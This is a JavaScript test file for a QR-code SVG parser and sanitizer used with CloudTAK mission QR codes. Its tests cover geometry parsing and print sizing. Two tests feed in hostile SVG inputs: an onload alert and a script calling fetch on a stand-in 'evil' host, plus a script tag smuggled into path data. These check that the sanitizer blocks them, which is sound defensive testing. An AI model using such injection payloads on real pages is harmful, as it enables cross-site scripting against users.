import test from 'node:test';
import assert from 'node:assert/strict';
import { parseQr, qrInches, qrSvg } from '../lib/qr.js';

// Shape of what CloudTAK's /api/marti/missions/{guid}/qr actually returns.
const REAL = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 39 39">'
    + '<path d="M1 1h7v7h-7zM9 1h1v1h-1z"/></svg>';

test('a CloudTAK mission QR parses to its module count and geometry', () => {
    const art = parseQr(REAL);

    assert.equal(art.modules, 39);
    assert.equal(art.paths.length, 1);
    assert.match(art.paths[0], /^M1 1h7v7h-7z/);
});

test('the printed size comes from the module count, within sane bounds', () => {
    // 0.6mm per module is the comfortable floor for a phone camera off paper.
    assert.equal(qrInches(39), 0.921);
    assert.equal(qrInches(49), 1.157);

    // A tiny payload still has to be big enough to aim at.
    assert.equal(qrInches(10), 0.9);
    // A huge one stops eating the map.
    assert.equal(qrInches(200), 1.4);
});

test('re-emitted markup carries only geometry', () => {
    const svg = qrSvg(parseQr(REAL));

    assert.match(svg, /^<svg viewBox="0 0 39 39"/);
    assert.match(svg, /<path d="M1 1h7v7h-7zM9 1h1v1h-1z" fill="#111"\/>/);
    assert.doesNotMatch(svg, /xmlns:xlink|<script|onload/);
});

test('a script in the input cannot reach the page', () => {
    // The service embeds this in a page it renders with a real browser, so the
    // input is never echoed -- only digits and path commands cross the boundary.
    const hostile = '<svg viewBox="0 0 39 39" onload="alert(1)">'
        + '<script>fetch("http://evil")</script>'
        + '<path d="M1 1h7v7h-7z"/></svg>';

    const svg = qrSvg(parseQr(hostile));

    assert.doesNotMatch(svg, /script|onload|evil/);
    assert.match(svg, /<path d="M1 1h7v7h-7z"/);
});

test('a path carrying anything but geometry is rejected outright', () => {
    const sneaky = '<svg viewBox="0 0 39 39"><path d="M1 1h7&quot;/><script>x</script>"/></svg>';

    assert.throws(() => parseQr(sneaky), /unexpected characters/);
});

test('markup that is not a square QR is refused', () => {
    assert.throws(() => parseQr('<svg><path d="M1 1h7z"/></svg>'), /no viewBox/);
    assert.throws(() => parseQr('<svg viewBox="0 0 39 20"><path d="M1 1h7z"/></svg>'), /not square/);
    assert.throws(() => parseQr('<svg viewBox="0 0 39 39"></svg>'), /no path data/);
});
